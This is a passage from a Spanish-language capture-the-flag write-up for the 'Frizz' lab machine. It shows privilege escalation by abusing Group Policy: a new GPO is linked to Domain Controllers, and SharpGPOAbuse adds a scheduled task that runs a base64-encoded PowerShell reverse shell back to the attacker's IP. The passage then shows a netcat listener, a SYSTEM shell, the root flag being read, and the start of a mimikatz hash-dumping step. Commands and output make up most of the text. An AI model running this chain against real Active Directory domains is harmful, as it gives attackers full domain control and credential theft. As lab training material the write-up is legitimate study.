</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">UserVersion      : 
</span></span><span class="line"><span class="cl">ComputerVersion  : 
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>M.SchoolBus pertenece al grupo &lsquo;Group Policy Creator Owners&rsquo; este nos permite crear GPOs por lo que creamos un nuevo GPO enlazado a <code>Domain Controllers</code> (&ldquo;GPO Vulnerable Privilegiado&rdquo;).</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; New-GPO -Name <span class="s2">&#34;sc&#34;</span> <span class="p">|</span> New-GPLink -Target <span class="s2">&#34;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GpoId       : 99dfdfd3-2451-4f46-9217-23810e133418
</span></span><span class="line"><span class="cl">DisplayName : sc
</span></span><span class="line"><span class="cl">Enabled     : True
</span></span><span class="line"><span class="cl">Enforced    : False
</span></span><span class="line"><span class="cl">Target      : <span class="nv">OU</span><span class="o">=</span>Domain Controllers,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">Order       : <span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Listamos los GPOs y observamos el recien creado.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; Get-GPO -All -Domain <span class="s2">&#34;frizz.htb&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Policy
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:25:44 AM
</span></span><span class="line"><span class="cl">UserVersion      : 
</span></span><span class="line"><span class="cl">ComputerVersion  : 
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Controllers Policy
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">UserVersion      : 
</span></span><span class="line"><span class="cl">ComputerVersion  : 
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">DisplayName      : sc
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\M</span>.SchoolBus
</span></span><span class="line"><span class="cl">Id               : 99dfdfd3-2451-4f46-9217-23810e133418
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">CreationTime     : 3/28/2025 6:03:52 AM
</span></span><span class="line"><span class="cl">ModificationTime : 3/28/2025 6:04:10 AM
</span></span><span class="line"><span class="cl">UserVersion      : 
</span></span><span class="line"><span class="cl">ComputerVersion  : 
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Con <a href="https://github.com/FSecureLABS/SharpGPOAbuse">SharpGPOAbuse</a> agregamos una &ldquo;Task&rdquo; especificando como autor a Administrator ademas el comando a ejecutar un ping a nuestra maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpGPOAbuse.exe --AddComputerTask --TaskName <span class="s2">&#34;sc&#34;</span> --Author Administrator --Command <span class="s2">&#34;cmd.exe&#34;</span> --Arguments <span class="s2">&#34;/c ping 10.10.14.105&#34;</span> --GPOName <span class="s2">&#34;sc&#34;</span>   
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="nv">Domain</span> <span class="o">=</span> frizz.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain <span class="nv">Controller</span> <span class="o">=</span> frizzdc.frizz.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Distinguished <span class="nv">Name</span> <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> GUID of <span class="s2">&#34;sc&#34;</span> is: <span class="o">{</span>99DFDFD3-2451-4F46-9217-23810E133418<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating file <span class="se">\\</span>frizz.htb<span class="se">\S</span>ysVol<span class="se">\f</span>rizz.htb<span class="se">\P</span>olicies<span class="se">\{</span>99DFDFD3-2451-4F46-9217-23810E133418<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\S</span>cheduledTasks<span class="se">\S</span>cheduledTasks.xml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> versionNumber attribute changed successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The version number in GPT.ini was increased successfully.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The GPO was modified to include a new immediate task. Wait <span class="k">for</span> the GPO refresh cycle.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done!
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Forzamos la actualizacion de Group Policy Settings.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; gpupdate /force
</span></span><span class="line"><span class="cl">Updating policy...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Computer Policy update has completed successfully.
</span></span><span class="line"><span class="cl">User Policy update has completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tras ello observamos pings provenientes de la maquina.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ sudo tcpdump -i tun0 icmp
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali: 
</span></span><span class="line"><span class="cl">tcpdump: verbose output suppressed, use -v<span class="o">[</span>v<span class="o">]</span>... <span class="k">for</span> full protocol decode
</span></span><span class="line"><span class="cl">listening on tun0, link-type RAW <span class="o">(</span>Raw IP<span class="o">)</span>, snapshot length <span class="m">262144</span> bytes
</span></span><span class="line"><span class="cl">09:02:35.919664 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 1, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:35.919724 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 1, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:36.823502 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 2, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:36.823520 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 2, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:37.737484 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 3, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:37.737502 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 3, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:38.651507 IP frizzdc.frizz.htb &gt; 10.10.14.105: ICMP <span class="nb">echo</span> request, id 1, seq 4, length <span class="m">40</span>
</span></span><span class="line"><span class="cl">09:02:38.651524 IP 10.10.14.105 &gt; frizzdc.frizz.htb: ICMP <span class="nb">echo</span> reply, id 1, seq 4, length <span class="m">40</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="shell-1">Shell</h2>
<p>Nuevamente creamos un GPO, esta vez para ejecutar una shell inversa.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; New-GPO -Name <span class="s2">&#34;sc&#34;</span> <span class="p">|</span> New-GPLink -Target <span class="s2">&#34;OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GpoId       : 9135b440-7b93-429a-999d-b54bed985510
</span></span><span class="line"><span class="cl">DisplayName : sc
</span></span><span class="line"><span class="cl">Enabled     : True
</span></span><span class="line"><span class="cl">Enforced    : False
</span></span><span class="line"><span class="cl">Target      : <span class="nv">OU</span><span class="o">=</span>Domain Controllers,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">Order       : <span class="m">2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; Get-GPO -All -Domain <span class="s2">&#34;frizz.htb&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RunspaceId       : c4994878-5250-4237-9195-9ea42b47dec7
</span></span><span class="line"><span class="cl">Id               : 31b2f340-016d-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Policy
</span></span><span class="line"><span class="cl">Path             : <span class="nv">cn</span><span class="o">={</span>31B2F340-016D-11D2-945F-00C04FB984F9<span class="o">}</span>,cn<span class="o">=</span>policies,cn<span class="o">=</span>system,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:25:44 AM
</span></span><span class="line"><span class="cl">User             : Microsoft.GroupPolicy.UserConfiguration
</span></span><span class="line"><span class="cl">Computer         : Microsoft.GroupPolicy.ComputerConfiguration
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RunspaceId       : c4994878-5250-4237-9195-9ea42b47dec7
</span></span><span class="line"><span class="cl">Id               : 6ac1786c-016f-11d2-945f-00c04fb984f9
</span></span><span class="line"><span class="cl">DisplayName      : Default Domain Controllers Policy
</span></span><span class="line"><span class="cl">Path             : <span class="nv">cn</span><span class="o">={</span>6AC1786C-016F-11D2-945F-00C04fB984F9<span class="o">}</span>,cn<span class="o">=</span>policies,cn<span class="o">=</span>system,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\D</span>omain Admins
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">CreationTime     : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">ModificationTime : 10/29/2024 7:19:24 AM
</span></span><span class="line"><span class="cl">User             : Microsoft.GroupPolicy.UserConfiguration
</span></span><span class="line"><span class="cl">Computer         : Microsoft.GroupPolicy.ComputerConfiguration
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">RunspaceId       : c4994878-5250-4237-9195-9ea42b47dec7
</span></span><span class="line"><span class="cl">Id               : 9135b440-7b93-429a-999d-b54bed985510
</span></span><span class="line"><span class="cl">DisplayName      : sc
</span></span><span class="line"><span class="cl">Path             : <span class="nv">cn</span><span class="o">={</span>9135B440-7B93-429A-999D-B54BED985510<span class="o">}</span>,cn<span class="o">=</span>policies,cn<span class="o">=</span>system,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl">Owner            : frizz<span class="se">\M</span>.SchoolBus
</span></span><span class="line"><span class="cl">DomainName       : frizz.htb
</span></span><span class="line"><span class="cl">CreationTime     : 3/28/2025 7:00:33 AM
</span></span><span class="line"><span class="cl">ModificationTime : 3/28/2025 7:00:32 AM
</span></span><span class="line"><span class="cl">User             : Microsoft.GroupPolicy.UserConfiguration
</span></span><span class="line"><span class="cl">Computer         : Microsoft.GroupPolicy.ComputerConfiguration
</span></span><span class="line"><span class="cl">GpoStatus        : AllSettingsEnabled
</span></span><span class="line"><span class="cl">WmiFilter        : 
</span></span><span class="line"><span class="cl">Description      : 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Generamos una shell inversa de powershell con <a href="https://www.revshells.com/">revshells</a>, utilizamos esta en el comando de la Task en SharpGPOAbuse para finalmente forzar la actualizacion.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt; .<span class="se">\S</span>harpGPOAbuse.exe --AddComputerTask --TaskName <span class="s2">&#34;sc&#34;</span> --Author Administrator --Command <span class="s2">&#34;cmd.exe&#34;</span> --Arguments <span class="s2">&#34;/c powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADUAIgAsADEAMwAzADgAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;</span> --GPOName <span class="s2">&#34;sc&#34;</span><span class="p">;</span> gpupdate /force
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> <span class="nv">Domain</span> <span class="o">=</span> frizz.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Domain <span class="nv">Controller</span> <span class="o">=</span> frizzdc.frizz.htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Distinguished <span class="nv">Name</span> <span class="o">=</span> <span class="nv">CN</span><span class="o">=</span>Policies,CN<span class="o">=</span>System,DC<span class="o">=</span>frizz,DC<span class="o">=</span>htb
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> GUID of <span class="s2">&#34;sc&#34;</span> is: <span class="o">{</span>9135B440-7B93-429A-999D-B54BED985510<span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Creating file <span class="se">\\</span>frizz.htb<span class="se">\S</span>ysVol<span class="se">\f</span>rizz.htb<span class="se">\P</span>olicies<span class="se">\{</span>9135B440-7B93-429A-999D-B54BED985510<span class="o">}</span><span class="se">\M</span>achine<span class="se">\P</span>references<span class="se">\S</span>cheduledTasks<span class="se">\S</span>cheduledTasks.xml
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> versionNumber attribute changed successfully
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The version number in GPT.ini was increased successfully.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> The GPO was modified to include a new immediate task. Wait <span class="k">for</span> the GPO refresh cycle.
</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Done!
</span></span><span class="line"><span class="cl">Updating policy...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Computer Policy update has completed successfully.
</span></span><span class="line"><span class="cl">User Policy update has completed successfully.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\M</span>.SchoolBus<span class="se">\D</span>ocuments&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>Tras ello obtuvimos una shell como Administrator, logrando realizar la lectura de la flag <code>root.txt</code>.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">â¯ rlwrap nc -lvp <span class="m">1338</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1338</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.105<span class="o">]</span> from frizzdc.frizz.htb <span class="o">[</span>10.10.11.60<span class="o">]</span> <span class="m">64154</span>
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; whoami
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem
</span></span><span class="line"><span class="cl">PS C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt; <span class="nb">cd</span> C:/Users/Administrator/Desktop
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; dir
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    Directory: C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Mode                 LastWriteTime         Length Name                                                                 
</span></span><span class="line"><span class="cl">----                 -------------         ------ ----                                                                 
</span></span><span class="line"><span class="cl">-a----         2/25/2025   2:06 PM           <span class="m">2083</span> cleanup.ps1                                                          
</span></span><span class="line"><span class="cl">-ar---         3/28/2025   2:56 AM             <span class="m">34</span> root.txt                                                             
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt; <span class="nb">type</span> root.txt
</span></span><span class="line"><span class="cl">bf426f3fb52bc1810fa9189ba6d2068f
</span></span><span class="line"><span class="cl">PS C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="dump-hashes">Dump Hashes</h2>
<p>Como administrador ejecutamos mimikatz para obtener los hashes de los usarios.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
